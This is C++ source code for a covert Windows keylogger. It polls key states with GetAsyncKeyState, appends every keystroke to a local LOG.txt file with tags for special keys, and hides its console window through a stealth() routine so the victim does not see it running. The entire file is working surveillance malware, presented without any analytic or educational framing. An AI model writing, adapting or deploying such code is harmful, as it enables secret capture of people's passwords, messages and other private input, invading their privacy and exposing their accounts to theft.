#include <iostream>
#include <Windows.h>
#include <fstream>
#include <TlHelp32.h>

using namespace std;

int Save (int key_stroke, string file);
void stealth();

int main()
{
    
    stealth();
    char i;
    std::string fileName = "LOG.txt";
 bool running = true;
    while (running) {
        for(i = 8; i <= 190; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                //char* filename_c_str = new char[fileName.length() + 1];
                //strcpy(filename_c_str, fileName.c_str());
                //Save(i, filename_c_str);
                //Save(i, (char*)fileName.c_str());
                Save(i, fileName);
                if(i == VK_ESCAPE){ // check if the key pressed is the ESC key
                    running = false;
                    break;
                }
            }
        }
    }
return 0;
}

int Save (int key_stroke, string file)
{
    if ( (key_stroke == 1) || (key_stroke == 2) )
        return 0;

    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file.c_str(), "a+");

    if (key_stroke == 8)
        fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
    else if (key_stroke == 13)
        fprintf(OUTPUT_FILE, "%s", "\n");
    else if (key_stroke == 32)
        fprintf(OUTPUT_FILE, "%s", " ");
    else if (key_stroke == VK_TAB)
        fprintf(OUTPUT_FILE, "%s", "[TAB]");
    else if (key_stroke == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    else if (key_stroke == VK_CONTROL)
        fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
    else if (key_stroke == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
    else if (key_stroke == VK_END)
        fprintf(OUTPUT_FILE, "%s", "[END]");
    else if (key_stroke == VK_HOME)
        fprintf(OUTPUT_FILE, "%s", "[HOME]");
    else if (key_stroke == VK_LEFT)
        fprintf(OUTPUT_FILE, "%s", "[LEFT]");
    else if (key_stroke == VK_UP)
        fprintf(OUTPUT_FILE, "%s", "[UP]");
    else if (key_stroke == VK_RIGHT)
        fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
    else if (key_stroke == VK_DOWN)
        fprintf(OUTPUT_FILE, "%s", "[DOWN]");
    else
        fprintf(OUTPUT_FILE, "%s", &key_stroke);

    fclose (OUTPUT_FILE);
    return 0;
}

void stealth()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth,SW_HIDE);
    system("pause");
}